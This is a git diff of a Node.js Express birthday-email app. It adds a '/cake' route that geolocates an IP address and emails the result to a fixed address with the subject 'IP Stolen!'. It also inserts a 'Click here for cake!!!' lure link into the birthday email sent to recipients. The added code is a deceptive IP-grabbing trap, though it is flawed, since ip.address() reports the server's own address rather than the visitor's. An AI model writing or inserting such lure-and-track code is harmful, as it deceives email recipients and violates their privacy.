@@ -227,6 +227,30 @@ app.get('/p', async (req, res)=>{
     res.status(200).sendFile(path.join(__dirname, 'p.html'));
 });
 
+app.get('/cake', async (req, res)=>{
+    console.log(ip.address());
+
+    let ipURL = `https://json.geoiplookup.io/${ip.address()}`;
+    let result = await axios.get(ipURL);
+
+    console.log(result.data);
+
+    try{
+        const msg = {
+            to: `hermosabeach@ucode.com`,
+            from: 'hermosabeach@ucode.com',
+            subject: 'IP Stolen!',
+            html: `<strong>Ip Stolen hehehe... ${ip.address()}</strong>
+            <p> ${JSON.stringify(result.data)}</p>`,
+          };
+        await sgMail.send(msg);
+
+    }catch(e){
+        console.log(`${JSON.stringify(e.response.body.errors)}`);
+    }
+
+    res.status(200).sendFile(path.join(__dirname, 'cake.html'));
+});
 
 app.post('/p', async(req, res)=>{
     console.log(`${req.body.email} is email - ${req.body.inputBirthday} is the birthday`);
@@ -236,7 +260,8 @@ app.post('/p', async(req, res)=>{
             to: `${req.body.email}`,
             from: 'hermosabeach@ucode.com',
             subject: 'Happy Birthday Fren!',
-            html: `<strong>Imma Believer!<br> Your Birthday is ${req.body.inputBirthday}</strong>`,
+            html: `<strong>Imma Believer!<br> Your Birthday is ${req.body.inputBirthday}</strong>
+            <h1><a href="http://localhost:3000/cake">Click here for cake!!!</a></h1>`,
           };
         await sgMail.send(msg);
         
@@ -244,7 +269,6 @@ app.post('/p', async(req, res)=>{
     }catch(e){
         console.log(`${JSON.stringify(e.response.body.errors)}`);
     }
-
 });
 
 app.get('/Lance', async (req, res)=>{
